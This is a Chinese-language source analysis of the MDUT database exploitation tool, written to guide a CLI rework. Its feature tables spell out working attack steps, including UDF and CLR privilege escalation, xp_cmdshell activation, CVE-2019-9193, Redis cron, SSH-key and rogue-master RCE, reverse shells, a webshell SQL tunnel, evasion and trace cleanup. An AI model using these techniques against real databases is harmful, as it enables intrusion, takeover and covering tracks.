# MDUT v2.1.1 完整功能分析报告（面向 CLI 二开）

> 分析对象：`/opt/MDUT-cli`（MDAT-DEV 源码目录，共 36 个 Java 文件、约 12327 行；git origin = https://github.com/hanc00l/MDUT-cli，上游为 SafeGroceryStore/MDUT）。
> 所有证据均为 `文件:行号`，路径相对 `/opt/MDUT-cli/`。

---

## A. 总体架构

### A.1 工程与构建
- Maven 单模块：`org.mdut : Multiple.Database.Utilization.Tools : 2.1.1`，Java 8（`MDAT-DEV/pom.xml:7-9,103-106`）。
- 打包方式：maven-assembly-plugin `jar-with-dependencies`，主类 `main`（`pom.xml:13-25`）。
- 依赖清单（`pom.xml:28-101`）：sqlite-jdbc 3.34.0、org.json、snakeyaml 1.28、lombok、pegdown 1.6.0、jedis 3.1.0、commons-lang 2.6、orai18n 19.3（Oracle 字符集补丁，非驱动）、fastjson 1.2.83、okhttps 3.3.0（com.ejlchina，封装 OkHttp）、commons-codec 1.8、jjwt 0.9.1。
- **pom 中没有 JavaFX 依赖，也没有任何 MySQL/MSSQL/PostgreSQL/Oracle JDBC 驱动依赖**（编译期依赖 JDK8 自带 JavaFX，驱动靠外部目录加载，见 A.4）。

### A.2 运行时目录布局（全部相对 jar 同目录，`Utils.getSelfPath()`）
`Utils.getSelfPath()` 取 jar 自身路径的父目录（`MDAT-DEV/src/main/java/Util/Utils.java:142-161`，基于 `CodeSource.getLocation()`）。运行所需外部资源：
```
<jar目录>/
├── config.yaml        # 首次启动自动生成（MainController.java:193-255）
├── data.db            # SQLite 连接配置库（ManagerDao.java:16-32）
├── Driver/            # 4 个 JDBC 驱动 jar（动态加载）
├── Plugins/           # UDF/CLR/隧道模板等资源
└── MDUT.jar
```

### A.3 分层结构
| 层 | 文件 | 职责 |
|---|---|---|
| Entity | ControllersFactory / DatabaseDateEntity / FilesEntity | Controller 静态注册表（`Entity/ControllersFactory.java:11` 静态 HashMap）+ JavaFX 表格绑定实体 |
| Dao | 5 个直连 Dao + 4 个 HTTP Dao + ManagerDao | 数据库操作实现（`Dao/`，Redis 无 HTTP 版） |
| Util | Utils / HttpUtil / OKHttpUtil / Base64XOR / YamlConfigs / MessageUtil / 4 个 *SqlUtil | 工具层 |
| Controller | 10 个 | JavaFX FXML 控制器，仅负责 UI 事件分发 |

关键设计：**每种数据库两套平行 Dao**（JDBC 直连 / HTTP 隧道），Controller 按 `dataObj.getString("ishttp")` 分流（如 `Controller/MysqlController.java:97-112`）。Dao 通过 `ControllersFactory.controllers.get("MysqlController")` 拿到 Controller 实例后**直接向 TextArea 写日志**（`Dao/MysqlDao.java:50`、`Dao/MysqlHttpDao.java:26`）——这是 Dao 层最重的 UI 耦合。

### A.4 JDBC 驱动加载方式（重点查证）
pom 中确实无数据库驱动依赖，驱动来自 **jar 同目录 `Driver/` 下的外部 jar**（仓库自带 4 个：`MDAT-DEV/src/main/Driver/mysql.jar 2.4MB / mssql.jar 318KB / oracle.jar 4.2MB / postgresql.jar 1MB`）。加载流程（四个 Dao 完全一致）：
1. 从 `config.yaml` 读 `X.Driver`（jar 路径）、`X.ClassName`（驱动类名）、`X.JDBCUrl`（`Dao/MysqlDao.java:53-59`，Mssql `Dao/MssqlDao.java:38-50`，Oracle `Dao/OracleDao.java:46-59`，PostgreSql `Dao/PostgreSqlDao.java:47-57`）；
2. **反射调用 `URLClassLoader.addURL` 把驱动 jar 塞进系统类加载器**（`MysqlDao.java:67-72`：`URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader(); METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class); METHOD.invoke(...)`）；
3. `Class.forName(DRIVER)` 触发注册（`MysqlDao.java:73`）。
4. `Utils.regroupDrivers(name)` 把当前驱动移到 DriverManager 队首，避免多驱动冲突（`Util/Utils.java:458-482`）。
- 驱动类名与 JDBC URL 模板（`Controller/MainController.java:222-239` 硬编码生成 config.yaml）：
  - MySQL：`com.mysql.cj.jdbc.Driver`，`jdbc:mysql://{0}:{1}/{2}?connectTimeout={3}&socketTimeout={3}&characterEncoding=utf-8&useSSL=false&serverTimezone=UTC&rewriteBatchedStatements=true`
  - MSSQL：`net.sourceforge.jtds.jdbc.Driver`，`jdbc:jtds:sqlserver://{0}:{1}/{2};loginTimeout={3};socketTimeout={3}`（v2.1.1 用 jTDS 替换了官方驱动，`CHANGELOG.md` 2022/05/24 节）
  - Oracle：`oracle.jdbc.driver.OracleDriver`，`jdbc:oracle:thin:@{0}:{1}:{2}`；Oracle 额外用系统属性设置超时 `oracle.jdbc.ReadTimeout`/`oracle.net.CONNECT_TIMEOUT`（`Dao/OracleDao.java:58-59`）
  - PostgreSQL：`org.postgresql.Driver`，`jdbc:postgresql://{0}:{1}/{2}?loginTimeout={3}&socketTimeout={3}`
- ⚠️ 二开风险：`(URLClassLoader) ClassLoader.getSystemClassLoader()` 强转在 **Java 9+ 会失败**（BuiltinClassLoader 不是 URLClassLoader）。CLI 版建议改 `ClassLoader:addURL` 方法句柄/`--add-opens` 或独立子进程/`URLClassLoader` 父子加载器方案。

---

## B. 各数据库功能矩阵（功能点 × 数据库）

图例：✅=直连+HTTP 均支持；🔒=仅 JDBC 直连；📡=仅 HTTP 隧道。

### B.1 MySQL（`Dao/MysqlDao.java` 434 行 / `Dao/MysqlHttpDao.java` 460 行 / `Util/MysqlSqlUtil.java`）
| 功能 | 方法 | 关键 SQL/逻辑 |
|---|---|---|
| 信息探测 | `getInfo`（MysqlDao.java:133-162；HttpDao:89-111） | `select CONCAT_WS('~',version(), @@version_compile_os, @@version_compile_machine)`（MysqlSqlUtil.java:11），解析出版本/OS/位数 |
| UDF 导出路径判定 | `versionOutfile`（MysqlDao.java:203-216） | 版本<5.0：Win→`c:\windows\temp\`、Linux→`/tmp/`；≥5.0 → 读 `@@plugin_dir`（`plugin_dir`，MysqlSqlUtil.java:9；MysqlDao.java:221-232，Win 路径双反斜杠转义） |
| UDF 文件选择 | `Option`（MysqlDao.java:168-195；HttpDao:156-181） | 按 `@@version_compile_os/machine` 选 `Plugins/Mysql/udf_win32_hex.txt / udf_win64_hex.txt / udf_linux32_hex.txt / udf_linux64_hex.txt` |
| UDF 提权 ✅ | `udf("sys_eval")`（MysqlDao.java:237-282）/ `importUDF`+`createMethod`（HttpDao:208-258） | ①先清残留函数 ②随机文件名 `hex(rand)+".temp"` ③`select <hex内容> into dumpfile '<plugin_dir>/xxx.temp'`（MysqlSqlUtil.java:12）④`create function sys_eval returns string soname 'xxx.temp'`（MysqlSqlUtil.java:13） |
| 命令执行 ✅ | `eval`（MysqlDao.java:292-316；HttpDao:303-322） | `select sys_eval('%s') as s;`（MysqlSqlUtil.java:14），按指定编码读 bytes |
| 反弹 Shell ✅ | `reverseShell`→`udf("backshell")`→`backShell`（MysqlDao.java:373-385,323-339；HttpDao:378-408） | 专用 DLL `udf_win_ex_hex.txt`（113KB），`select backshell('%s','%s') as s;`（MysqlSqlUtil.java:15） |
| NTFS ADS 建目录 ✅ | `ntfsdir`（MysqlDao.java:346-366；HttpDao:329-346） | `select '1' into dumpfile '<plugin_dir截尾>::$INDEX_ALLOCATION'`（MysqlSqlUtil.java:16），绕过 `secure_file_priv`/目录限制在 plugin_dir 下建目录的技巧 |
| 清痕 clean ✅ | `cleanudf`+`removeEvilFunc`（MysqlDao.java:407-432,387-400；HttpDao:353-371,264-295） | 先 `sys_eval('del /f <dir>*.temp' / 'rm -f ...')` 删 DLL 文件，再 `drop function if exists sys_eval;` / `drop function if exists backshell;`（MysqlSqlUtil.java:17-18） |
| 连接测试 ✅ | `testConnection`（MysqlDao.java:82-89；HttpDao:51-67） | 直连：真实建连后关闭；HTTP：`select '<随机串>'` 回显比对（MysqlSqlUtil.java:10） |

### B.2 MSSQL（`Dao/MssqlDao.java` 625 行 / `Dao/MssqlHttpDao.java` 784 行 / `Util/MssqlSqlUtil.java` 132 行，最丰富）
| 功能 | 方法 | 关键 SQL/逻辑 |
|---|---|---|
| 信息探测 | `getVersion`/`getisdba`（MssqlDao.java:250-284） | `select @@version`（MssqlSqlUtil.java:39）；`select is_srvrolemember('sysadmin')`（:40） |
| xp_cmdshell 开关+执行 ✅ | `activateXPCS`（MssqlDao.java:133-143）/`runcmdXPCS`（:166-179）/关闭见 `clearHistory` | `EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;`（MssqlSqlUtil.java:10-11）；执行 `exec master..xp_cmdshell N'%s'`（:13，命令内 `'`→`''` 转义 MssqlDao.java:170）；关闭 SQL :41 |
| OAP+COM 回显执行 ✅ | `runcmdOAPCOM`（MssqlDao.java:216-222；HttpDao:393-414） | `sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}'`(WScript.Shell) + `sp_oamethod exec/StdOut/readall` 直接回显（MssqlSqlUtil.java:26-31）；需先激活 OAP `activationOAPSql`（:12） |
| OAP+BULK 落盘回显 ✅ | `runcmdOAPBULK`（MssqlDao.java:188-208；HttpDao:424-471） | ①取 SQL 安装目录 `master..sysfiles`（:14-20 两种写法）②`sp_oacreate 'wscript.shell'` run `cmd /c <cmd> > "<目录><随机>.txt"`（:21）③建表 `oashellresult` + `WAITFOR DELAY '0:0:%s'`（用超时输入当延时秒数）+ `bulk insert ... from '<文件>'`（:22-25）④`SELECT * FROM oashellresult`（:25） |
| SQL JobAgent 无回显执行 ✅ | `runcmdagent`（MssqlDao.java:229-244；HttpDao:478-499） | 随机 jobname；`sp_add_job / sp_add_jobstep @subsystem='CMDEXEC' / sp_add_jobserver / sp_start_job`（MssqlSqlUtil.java:32-38）；提示"该方法没有回显" |
| CLR 提权套件 ✅ | `activateCLR`（MssqlDao.java:333-345）→`initCLR`（:351-369）→`createCLRFunc`（:395-407）→`clrruncmd`（:416-430）；`checkCLR`（:375-390） | ①`clr enabled` 1（MssqlSqlUtil.java:45）②删旧 kitmain/MDATKit（:43-44）③读 `Plugins/Mssql/clr.txt`（2.17MB hex）拼 `CREATE ASSEMBLY [MDATKit] ... FROM 0x<hex> WITH PERMISSION_SET = UNSAFE`（:47-50）④`CREATE PROCEDURE [dbo].[kitmain] @method,@arguments AS EXTERNAL NAME [MDATKit].[StoredProcedures].[kitmain]`（:52-54）⑤执行 `exec kitmain 'cmdexec',N'%s'`（普通）/`'supercmdexec'`（提权）（:55-56），UI 单选"普通执行/提权执行"（`Controller/MssqlController.java:242-246`）。连接建立后自动 checkCLR，存在则解锁 CLR 单选（MssqlController.java:190-196 区段） |
| trustworthy 开关 ✅ | `setTrustworthy`（MssqlDao.java:315-328；HttpDao:193-213） | `alter database %s set trustworthy %s`（MssqlSqlUtil.java:46，为 CLR 导入扫清障碍） |
| 文件管理 ✅ | `getDisk`/`getFiles`/`normalUpload`/`normalDownload`/`normaldelete`/`normalmkdir`（MssqlDao.java:468-568） | 盘符 `EXEC xp_fixeddrives`（:66）；列目录 `xp_dirtree N'%s',1,1` 建临时表 DirectoryTree 再查（:67-71）；上传 `sp_OACreate 'ADODB.Stream'` Write hex + SaveToFile（:58-65）；下载 `sp_oacreate 'scripting.filesystemobject'` opentextfile+readline 循环（:72-84；HTTP 版拆两段防单条 SQL 过长 :85-101）；删除 `Scripting.FileSystemObject.DeleteFile`（:102-105）；建目录 `xp_create_subdir`（:106） |
| CLR 文件操作 ✅ | `clrmkdir`/`clrdelete`/`clrupload`（MssqlDao.java:575-605；HttpDao:660-707） | `exec kitmain 'newdir'/'delete'/'writefile',N'%s'`（MssqlSqlUtil.java:107-109；writefile 参数 `路径^hex内容`） |
| 清痕 clean ✅ | `clearHistory`（MssqlDao.java:289-307；HttpDao:243-292） | 依次：关 xp_cmdshell→关 OAP→drop `oashellresult` 表→drop kitmain+MDATKit 程序集 |
| 一键恢复组件 ✅ | `recoveryAll`（MssqlDao.java:610-621；HttpDao:712-728） | 20 条 `sp_addextendedproc` 恢复 xp_cmdshell/xp_dirtree/Sp_OA*/xp_reg* 等（MssqlSqlUtil.java:110-130） |
| 其他 | 统一执行 `excute`（MssqlDao.java:97-127） | **空编码默认 GB2312**（:102-104）；`getSystemPassword`(wdigest) 功能在 v2.1.0 已删除（注释残留 MssqlDao.java:432-441、MssqlSqlUtil.java:57） |

### B.3 Oracle（`Dao/OracleDao.java` 573 行 / `Dao/OracleHttpDao.java` 741 行 / `Util/OracleSqlUtil.java` / `Plugins/Oracle/*.java`）
| 功能 | 方法 | 关键 SQL/逻辑 |
|---|---|---|
| 信息探测 | `getVersion`/`isDBA`（OracleDao.java:140-173） | `select banner from v$version`（OracleSqlUtil.java:4），banner 含 "windows" 判 OS；`select userenv('ISDBA') from dual`（:6） |
| Java 命令执行 ✅ | `importShellUtilJAVA`（OracleDao.java:287-316）→`executeCommand(type=java)`（:357-386） | 读 `Plugins/Oracle/ShellUtil.java` 源码，`create or replace and compile java source named "ShellUtil" as <源码>`（OracleSqlUtil.java:14）；`dbms_java.grunt_permission` 三连授权：FilePermission `<<ALL FILES>> read,write,execute,delete`、RuntimePermission `*`、SocketPermission `* accept,connect,listen,resolve`（:15-17）；建函数 `shellrun(method,params,encoding)`（:18）；执行 `select shellrun('exec','%s','%s') from dual`（:24） |
| Scheduler 命令执行 ✅ | `schedulerCmd`（OracleDao.java:181-221）+`getJobStatus`（:252-282）+`deleteJob`（:227-244） | `DBMS_SCHEDULER.create_job(job_type=>'EXECUTABLE', number_of_arguments=>N, job_action=>'<程序>')` → 逐参数 `set_job_argument_value` → `enable` → 查 `USER_SCHEDULER_JOB_RUN_DETAILS`（status/additional_info，OracleSqlUtil.java:7-13），执行完自动 drop_job |
| 反弹 Shell ✅ | `reverseJavaShell`（OracleDao.java:443-458） | `select shellrun('connectback','%s^%s','') from dual`（OracleSqlUtil.java:32）；ShellUtil.connectBack 双线程对接 stdin/stdout（Plugins/Oracle/ShellUtil.java:76-124） |
| 文件管理 ✅ | `getDisk`/`getFiles`/`upload`/`download`/`delete`（OracleDao.java:465-572） | 全部走 `FileUtil` Java 源：`select filerun('listdiver'/'listfile','路径',编码)/'writefile','路径^hex'/'readfile','路径'/'deletefile','路径' from dual`（OracleSqlUtil.java:33-37）；FileUtil 支持方法 listfile/getpath/readfile/writefile/listdiver/deletefile（Plugins/Oracle/FileUtil.java:5-20） |
| 清痕 clean ✅ | `deleteShellFunction`/`deleteFileFunction`（OracleDao.java:391-436） | `DROP JAVA SOURCE "ShellUtil"` + `drop function SHELLRUN`（FileUtil 同理，OracleSqlUtil.java:26-30） |
| 错误码提示 | `executeCommand`（OracleDao.java:374-379） | `ORA-00904`→请先初始化方法；`ORA-27486`→权限不足 |
| Oracle 版 HTTP 隧道 | OracleHttpDao 方法清单（:47-698） | testConnection/getConnection/isDBA/getVersion/importShellUtilJAVA/importFileUtilJAVA/deleteShellFunction/executeCommand/schedulerCmd/getJobStatus/deleteJob/deleteFileFunction/getDisk/getFiles/upload/delete/download/reverseJavaShell —— 功能与直连版对齐 |

### B.4 PostgreSQL（`Dao/PostgreSqlDao.java` 408 行 / `Dao/PostgreSqlHttpDao.java` 464 行 / `Util/PostgreSqlUtil.java`）
| 功能 | 方法 | 关键 SQL/逻辑 |
|---|---|---|
| 信息探测+版本分档 | `getInfo`（PostgreSqlDao.java:317-407） | `SELECT version()`（PostgreSqlUtil.java:10）判 win/linux（关键词 w64/w32/mingw/visual studio/Visual C++）与位数；`SHOW server_version`（:11）解析大版本号；分档：`≤8.2→low`、`8.2<x<9.3→udf`、`≥9.3→cve`（:379-396）；临时目录 Win=`c:\users\public\`、Linux=`/tmp/`（:332,339） |
| 低版本 system 函数 ✅ | `createEval`（PostgreSqlDao.java:99-122；HttpDao:375-397） | 依次尝试 `/lib/x86_64-linux-gnu/libc.so.6`、`/lib/libc.so.6`、`/lib64/libc.so.6`：`CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '<libc路径>','system' LANGUAGE C STRICT`（PostgreSqlUtil.java:12） |
| UDF 提权 ✅ | `udf`+`injectUdf`（PostgreSqlDao.java:151-185,125-146；HttpDao 对应） | ①随机 PIN `lo_create`（:14）②UDF so 的 hex 按 **4096 字符/片** `INSERT INTO pg_largeobject VALUES (pin, 序号, decode('hex','hex'))`（:13）③`lo_export` 写出 `<tmp>/<pin>.temp`（:15）④`CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '<文件>','sys_eval' LANGUAGE C`（:16）⑤`lo_unlink` 清 largeobject（:18）。插件文件按 `<版本>_<平台>_<位数>_hex.txt` 拼路径（PostgreSqlDao.java:387） |
| 命令执行 ✅ | `eval` 分发（PostgreSqlDao.java:285-298） | low：`system('cmd > /tmp/postgre_system')` + `COPY sectest111 FROM '/tmp/postgre_system'` 回显（:19-23，`LowVersionEval` :187-225）；udf：`select sys_eval('%s')`（:24）；cve：**CVE-2019-9193** `COPY cmd_exec FROM PROGRAM '%s'` + select + drop（:25-28，`cveEval` :244-283，代码注释标注来源 PayloadsAllTheThings :243） |
| 清痕 clean ✅ | `clear`（PostgreSqlDao.java:300-315；HttpDao:399-413） | `drop function sys_eval(text);`（PostgreSqlUtil.java:29） |
| 连接测试 ✅ | `testConnection`（PostgreSqlDao.java:74-80；HttpDao:47-） | regroupDrivers 参数是 `"ostgresql"`（少一个 p，仍能子串匹配，PostgreSqlDao.java:76） |

### B.5 Redis（`Dao/RedisDao.java` 293 行，Jedis 3.1.0；**仅直连，无 HTTP 隧道**，CHANGELOG v2.1.0"Redis暂不支持"）
| 功能 | 方法 | 关键逻辑 |
|---|---|---|
| 信息探测 | `getInfo`（RedisDao.java:73-92） | `INFO` + `CONFIG GET dir`，正则取 `os:`/`redis_version:`/`arch_bits:`（Utils.java:666-673 `regularMatch`）；日志提示 4.x~5.0.5 可主从 RCE |
| 写文件/ Persistence | `redisavedb`（:94-98） | `CONFIG SET dir` + `CONFIG SET dbfilename` + `SAVE` |
| 写 CRON 计划任务 | `crontab`（:117-138） | key `xxcron`，值前后包 `\n\n`；依次尝试 `/var/spool/cron/`、`/var/spool/cron/crontab/`、`/var/spool/cron/crontabs/`，文件名随机 |
| 写 SSH 公钥 | `sshkey`（:140-156） | key `xxssh`，`CONFIG SET dir <用户路径>` + dbfilename=`authorized_keys` + SAVE |
| 主从同步 RCE | `rogue`（:158-192）+ 外部 `Plugins/Redis/redis-cus-rogue.py`（伪装 master，PSYNC 回传 exp.so） | `SLAVEOF vps port` → 记录并 `CONFIG SET slave-read-only no` → `dbfilename=exp.so` → 等待同步后 `MODULE LOAD <dir>/exp.so` → `SLAVEOF NO ONE` |
| 命令执行 | `eval`（:236-247） | 原生命令 `system.exec <cmd>`（枚举 SysCommand，:194-207），按编码读字节回显 |
| 反弹 Shell | `revShell`（:224-234） | `system.rev <ip> <port>`（:209-222） |
| 清痕 clean | `clean`（:254-291） | 恢复 dir/slave-read-only/dbfilename=dump.rdb → `SLAVEOF NO ONE` → `system.exec rm -f <dir>/exp.so` → `MODULE UNLOAD system` → `DEL xxssh/xxcron` |

### B.6 连接配置管理（`Dao/ManagerDao.java`，SQLite）
`listDatabases`（:53-69）/`findDataByid`（:77-93）/`addDatebase` 20 字段 INSERT（:120-145）/`updateDatebase`（:172-197）/`delDatebaseById`（:205-210）。DB 文件 `data.db` 必须存在于 jar 同目录，否则启动报"数据库文件丢失"（:25-26）。

---

## C. HTTP 隧道机制详解

**结论：不是哥斯拉（Godzilla）、不是冰蝎（Behinder），是 MDUT 自研的极简单协议**——"自定义 Base64+循环 XOR"，仅在 WebShell 里代为执行 SQL。README_ZH.md 致谢列表提到冰蝎仅为作者关联项目，隧道实现与其无关。

### C.1 服务端模板（`MDAT-DEV/src/main/Plugins/Template/`）
| 文件 | 大小 | 服务端技术/驱动 |
|---|---|---|
| mysql_tunnel.php | 1.6KB | PHP mysqli |
| postgresql_tunnel.php | 2.3KB | PHP pg 连接 |
| mssql_tunnel.aspx | 2.0KB | Jscript.NET `System.Data.SqlClient`（`<%@ Page Language="Jscript"%>`） |
| oracle_tunnel.jsp | 4.3KB | JSP JDBC（`DriverManager.getConnection(url,...)`，oracle_tunnel.jsp:45） |

四个模板协议一致：`{KeyString}` 占位符替换为密钥；解密 POST 值后按 `|` 切分（aspx `Split("|")` mssql_tunnel.aspx:32、jsp `split("\\|")` oracle_tunnel.jsp:102、php `explode("|",...)` mysql_tunnel.php:38）。

### C.2 协议格式（客户端 → 服务端）
- **请求**：POST 表单，**参数名 = 密钥字符串本身**，参数值 = `Base64( XOR( 明文, key ) )`。
  - 明文（MySQL/Oracle/PostgreSQL，`MysqlHttpDao.java:424-428`）：`ip:port|username|password|database|Base64(SQL)`
  - 明文（MSSQL 多一段，`MssqlHttpDao.java:744-749`）：`ip:port|username|password|database|Base64(SQL)|timeout`
  - SQL 本身再包一层 Base64（服务端 `base64_decode($arg[4])`，mysql_tunnel.php:43），保证任意 SQL 可传输。
- **XOR**：密钥逐字节循环异或 `out[i] = a[i] ^ key[i % key.length]`（`Util/Base64XOR.java:110-116`）；Base64 用 commons-codec（Base64XOR.java:7,80-101）。
- **响应**：服务端把输出 `base64_xor_encrypt` 后 echo（mysql_tunnel.php:6-20）；客户端 `Base64XOR.decode(response, key, code)` 还原（如 MysqlHttpDao.java:453）。
- **状态约定**：
  - 执行成功但无结果集 → `Status | True`（mysql_tunnel.php:51；客户端判定 `response.equals("Status | True")`，MssqlHttpDao.java:153 等）
  - 任何异常 → `ERROR://` + 错误消息（mysql_tunnel.php:46,66），客户端用 `contains("ERROR://")` 判错。
  - 列分隔符 `\t|\t`、行分隔 `\r\n`（aspx/jsp 版），客户端各处 `replace("\t|\t","")` 清理（MssqlHttpDao.java:47,90,104 等）。
  - 超时：响应含 "同步请求异常" → 返回 "ERROR://请尝试延长超时时间"（MssqlHttpDao.java:774-776）。

### C.3 客户端网络栈（`Util/OKHttpUtil.java` 295 行）
- 基于 com.ejlchina okhttps 3.3.0（OkHttp 封装），**信任所有证书 + 跳过主机名校验**（OKHttpUtil.java:29-49 自实现 X509TrustManager/HostnameVerifier）。
- 超时三件套 connect/write/read 均设为用户 timeout 秒（:85-87）。
- **自定义 HTTP 头**：用户配置的 headers 经 `Utils.splitHeaders`（"K: V" 每行一条，Utils.java:509-518）注入；未指定 User-Agent 时**从约 100 条 UA 池随机选取**（Utils.java:26-128 uaList，`randomUserAgent` :635-638；OKHttpUtil.java:240-243）。
- **代理**：HTTP/SOCKS5 两种（各 Dao executeSQLStatement 内构造 `Proxy.Type.HTTP/SOCKS`，MysqlHttpDao.java:435-451），支持代理用户名密码 `Authenticator.setDefault`（OKHttpUtil.java:74-79）。
- `Util/HttpUtil.java`（681 行，裸 HttpURLConnection）主要供**更新下载**使用：`downloadFile`（HttpUtil.java:611-658）。

### C.4 隧道功能覆盖
Mysql/Mssql/Oracle/PostgreSql 四库的功能在 HTTP 版 Dao 中与直连版**一一对应实现**（每条 SQL 先 `Base64XOR.base64Encode(sql...)` 再走隧道，见 B 节各 ✅ 标注；Oracle HTTP 版方法清单见 `Dao/OracleHttpDao.java:47-698`）。Redis 不支持隧道。连接弹窗"使用 HTTP 通道"勾选后展开 URL/密钥/自定义头/代理四组配置（`Controller/AddAndEditController.java:199-227`）。

---

## D. 隧道脚本生成与设置项

### D.1 TunnelGenerationController（`Controller/TunnelGenerationController.java` 122 行，FXML: tunnelGeneration.fxml）
- 脚本类型下拉：JSP/ASPX/PHP，默认 JSP（:52-60）；数据库类型下拉：Mssql/Mysql/Oracle/PostgreSql，默认 Oracle（:63-72）。
- `create`（:77-99）：读 `Plugins/Template/<db小写>_tunnel.<脚本小写>`，把 `{KeyString}` 替换为用户密钥填入文本框；组合不存在时显示"暂时不支持此脚本"（实际仓库只有 4 个模板，即 MySQL 只有 PHP、MSSQL 只有 ASPX、Oracle 只有 JSP、PostgreSQL 只有 PHP——其它组合 UI 上可选但生成会失败）。
- `randomGenerate`（:101-104）：`Utils.getRandomString()` 生成 5-15 位随机密钥（Utils.java:179-189，字母+数字）。
- `save`（:106-118）：JavaFX FileChooser 另存。
- 主菜单入口：MainController `createTunnelAction`（MainController.java:722-736，窗口标题"HTTP 通道"）。

### D.2 SettingController（`Controller/SettingController.java` 244 行，FXML: setting.fxml）
- 可配置项：`Global.StartWarn`（启动免责声明开关，:100-123）；每个数据库 3 项——`Driver`（jar 路径，按钮弹 FileChooser 选文件 :145-183）、`ClassName`、`JDBCUrl`（文本框）。
- `SaveAction`（:186-235）：逐键 `YamlConfigs.updateYaml` 写回 jar 同目录 `config.yaml`（YamlConfigs 实现：读取 :33-44、点分 key 取值 :53-65、递归改值写回 :116-154）。
- `autoUpdateBox` 复选框存在但**更新逻辑被注释**（:205、:211）——即无自动更新选项。
- 主界面还有"重置配置文件"：删除 config.yaml 后按硬编码模板重建（MainController.java:691-710 → initConfigFile :193-255）。

### D.3 AddAndEditController（连接管理，584 行，FXML: addAndEdit.fxml）
- 数据库类型 ChoiceBox：Mysql/Mssql/Oracle/PostgreSql/Redis；选中后自动填默认端口/用户（3306/root、1433/sa、1521/orcl、5432/postgres、6379），Redis 禁用用户名与库名（:155-192）。
- HTTP 通道勾选启用 URL/密钥/自定义 Header/代理组；代理勾选启用类型(HTTP/SOCKS5)/地址/端口/账密（:197-228）。
- 测试连接按类型分发到各 Dao（:230-439+），构造临时 JSONObject 传参。
- 保存调用 `ManagerDao.addDatebase/updateDatebase`。

### D.4 主界面与各库 Tab 的操作面（GUI 按钮 → 方法）
- **MainController**（737 行）：TableView 连接列表（增/改/删/打开/刷新，:316-399）；双击行打开对应库窗口 `openWindows`（:405-424 分发 5 种库）；菜单：设置/更新/关于/文档（外链语雀 :713-719）/重置配置/HTTP 通道/退出；免责声明弹窗（:158-175，不同意即 `System.exit(0)`）。窗口关闭时强制 `Thread.stop()` 清理工作线程（:452-470）。
- **MysqlController**（234 行）：编码选择 UTF-8/GB2312/GBK（:135-144）；按钮 `mysqludf`→UDF 提权（:146-161）、`mysqleval`→执行命令（:210-233）、`reverseRun`→反弹 Shell（:163-178）、`mysqlntfs`→NTFS 建目录（:180-193）、`mysqlclean`→清痕（:195-208）。
- **MssqlController**（1213 行，最复杂）：连接后自动 getVersion/getisdba/checkCLR/初始化文件管理器（:171-236）；命令执行单选组：`RadioButton_oashellbulk`（OAP+BULK，带延时输入框）/`RadioButton_oashellcom`（OAP+COM）/`RadioButton_xpcmdshell`/`RadioButton_AgentJob`/`RadioButton_CLR`（配"普通执行/提权执行"下拉，:238-294，分发逻辑 :577-860）；工具按钮：激活 xp_cmdshell(:465)/激活 OAP(:481)/激活 CLR(:497)/清理痕迹 `CloseExp`(:550)/恢复组件 `recoveryAllAction`(:1197)；文件管理器：TreeView 盘符+TableView 文件列表（`initFileManager` :299-337，`showFilesOnTable` :418+），按钮 ReadPath(:870)/Return(:876)/normalmkdir(:884)/clrmkdir(:931)/normalUpload(:972)/normalDownload(:1002)/normalDelete(:1062)/clrUpload(:1117)/clrDelete(:1156)。
- **OracleController**（885 行）：命令执行方式单选 JAVA/SCHEDULER（`RadioButton_JAVA`/`RadioButton_SCHEDULER`，:44-47,253-258）；按钮：CreateShellUtil(:490)/CreateFileUtil(:507)/DeleteFuction(:525)/OracleCommandRun(:544)/reverseRun(:581)；反弹 Shell 又分 `reverseJavaRadioBtn`/`reverseSchedulerRadioBtn`（:119-122）；文件管理器：StartFileManager(:613)/ReadPath(:630)/Return(:649)/Upload(:671)/Delete(:699)/download(:756)/Refresh(:815)/browseFile(:835)/singleUpload(:845)（v2.1.1 新增单独上传，CHANGELOG）。
- **PostgreSqlController**（208 行）：`postgreSqlSystem`→创建 system 函数(:139)/`postgreSqlcUdf`→UDF 提权(:152)/`postgreSqlEval`→执行命令(:180)/`postgreSqlclean`→清痕(:166)。
- **RedisController**（252 行）：`redisScheduledTasks`→写 CRON(:136)/`redisReplaceSSHKey`→写 SSH 公钥(:146)/`redisSlave`→主从 RCE(:155，finally 强制 slaveofNoOne)/`redisEvalCommand`→system.exec(:191)/`redisRev`→system.rev 反弹(:214)/`redisClear`→清痕(:182)。
- **UpdateController**（128 行）：见 H 节。

---

## E. 数据持久化（data.db 表结构）

- 文件：`MDAT-DEV/src/main/data.db`（16KB，SQLite 3），由 sqlite-jdbc 3.34.0 访问（pom.xml:30-33；ManagerDao.java:16-32：`jdbc:sqlite:<selfPath>/data.db`，autocommit）。
- 实测 `sqlite3 .schema`（当前库**无样例行，为空库**，另有内置表 `sqlite_sequence`）：
```sql
CREATE TABLE data (
  id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
  databasetype TEXT NOT NULL DEFAULT '',   -- Mysql/Mssql/Oracle/PostgreSql/Redis
  ipaddress   TEXT NOT NULL DEFAULT '',
  port        TEXT NOT NULL DEFAULT '',
  username    TEXT NOT NULL DEFAULT '',
  password    TEXT NOT NULL DEFAULT '',    -- ★明文存储
  database    TEXT NOT NULL DEFAULT '',
  timeout     TEXT NOT NULL DEFAULT '',    -- 秒
  memo        TEXT NOT NULL DEFAULT '',
  ishttp      TEXT NOT NULL DEFAULT '',    -- 'true'/'false' 字符串
  url         TEXT NOT NULL DEFAULT '',    -- 隧道 WebShell 地址
  encryptionkey TEXT NOT NULL DEFAULT '',  -- 隧道密钥
  isproxy     TEXT NOT NULL DEFAULT '',
  proxytype   TEXT NOT NULL DEFAULT '',    -- HTTP/SOCKS5
  proxyaddress TEXT NOT NULL DEFAULT '',
  proxyport   TEXT NOT NULL DEFAULT '',
  proxyusername TEXT NOT NULL DEFAULT '',
  proxypassword TEXT NOT NULL DEFAULT '',
  httpheaders TEXT NOT NULL DEFAULT '',    -- 多行 "K: V"
  connecttype TEXT NOT NULL DEFAULT '',    -- 常规连接/HTTP通道等展示用
  addtime     TEXT NOT NULL DEFAULT ''     -- yyyy-MM-dd HH:mm:ss
);
